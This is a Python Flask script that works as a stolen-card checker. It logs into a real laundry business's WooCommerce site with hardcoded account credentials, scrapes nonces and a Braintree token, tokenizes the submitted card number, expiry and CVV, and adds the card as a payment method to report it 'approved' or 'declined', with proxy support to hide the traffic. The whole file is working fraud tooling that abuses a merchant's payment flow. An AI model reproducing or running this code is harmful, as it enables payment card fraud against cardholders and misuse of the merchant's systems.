from flask import Flask, request, jsonify
import requests, base64, re
from bs4 import BeautifulSoup

app = Flask(__name__)

@app.route('/check', methods=['GET'])
def check_card():
    cc = request.args.get('cc')
    proxy_input = request.args.get('proxy')

    if not cc:
        return jsonify({'error': 'cc parameter is required'}), 400

    try:
        number, month, year, cvv = cc.strip().replace(' ', '').split('|')
        month = int(month)
        year = int(year)
    except:
        return jsonify({'error': 'Invalid cc format. Use xxxx|mm|yy|cvv'}), 400

    proxies = None
    if proxy_input:
        proxy_parts = proxy_input.split(':')
        if len(proxy_parts) == 4:
            host, port, user, pwd = proxy_parts
            proxy_auth = f"http://{user}:{pwd}@{host}:{port}"
        elif len(proxy_parts) == 2:
            host, port = proxy_parts
            proxy_auth = f"http://{host}:{port}"
        else:
            return jsonify({'error': 'Invalid proxy format'}), 400

        proxies = {"http": proxy_auth, "https": proxy_auth}

    session = requests.Session()

    try:
        # Step 1: Get login nonce
        r = session.get('https://boltlaundry.com/loginnow/', proxies=proxies, timeout=60)
        soup = BeautifulSoup(r.text, 'html.parser')
        ihc_nonce_tag = soup.find('input', {'name': 'ihc_login_nonce'})
        if not ihc_nonce_tag or 'value' not in ihc_nonce_tag.attrs:
            return jsonify({'status': 'fail', 'reason': 'Login nonce not found'}), 500
        nonce = ihc_nonce_tag['value']

        # Step 2: Login
        data = {
            'ihcaction': 'login',
            'ihc_login_nonce': nonce,
            'log': 'SahilPro',
            'pwd': 'luckypro',
        }
        session.post('https://boltlaundry.com/loginnow/', data=data, proxies=proxies, timeout=60)

        # Step 3: Access add-payment-method page
        r = session.get('https://boltlaundry.com/my-account/add-payment-method/', proxies=proxies, timeout=60)
        soup = BeautifulSoup(r.text, 'html.parser')
        token_js = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', r.text)
        if not token_js:
            return jsonify({'status': 'fail', 'reason': 'Braintree token not found'}), 500

        b64_token = token_js.group(1)
        decoded = base64.b64decode(b64_token).decode()
        fingerprint_match = re.search(r'authorizationFingerprint":"([^"]+)"', decoded)
        if not fingerprint_match:
            return jsonify({'status': 'fail', 'reason': 'Authorization fingerprint not found'}), 500
        auth_token = fingerprint_match.group(1)

        nonce1 = soup.find(id="woocommerce-add-payment-method-nonce")
        if not nonce1:
            return jsonify({'status': 'fail', 'reason': 'Payment nonce not found'}), 500

        # Step 4: Tokenize card
        headers = {
            'authorization': f'Bearer {auth_token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
        }
        payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'random-session'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { last4 }}}',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': number,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                        'billingAddress': {'postalCode': '10080', 'streetAddress': '323 E Pine St'},
                    },
                    'options': {'validate': False},
                }
            }
        }

        r = requests.post('https://payments.braintree-api.com/graphql', json=payload, headers=headers, proxies=proxies, timeout=60)
        if 'errors' in r.json():
            return jsonify({'status': 'declined', 'reason': 'Tokenization failed'}), 400

        tok = r.json()['data']['tokenizeCreditCard']['token']

        # Step 5: Add card
        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production"}',
            'woocommerce-add-payment-method-nonce': nonce1['value'],
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        r = session.post('https://boltlaundry.com/my-account/add-payment-method/', data=data, proxies=proxies, timeout=60)
        soup = BeautifulSoup(r.text, 'html.parser')
        error_ul = soup.find('ul', class_='woocommerce-error')

        if error_ul:
            full_text = error_ul.get_text(strip=True)
            match = re.search(r'Reason:\s*(.*)', full_text)
            reason = match.group(1) if match else full_text

            approved_keywords = ['CVV.', 'CVV matched', 'CVV pass']
            if reason.strip() in approved_keywords:
                return jsonify({'status': 'approved', 'reason': 'CVV Matched ✅', 'gateway': 'Braintree'})
            else:
                return jsonify({'status': 'declined', 'reason': reason, 'gateway': 'Braintree'})
        else:
            return jsonify({'status': 'approved', 'reason': 'Card added successfully', 'gateway': 'Braintree'})

    except Exception as e:
        return jsonify({'status': 'error', 'reason': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
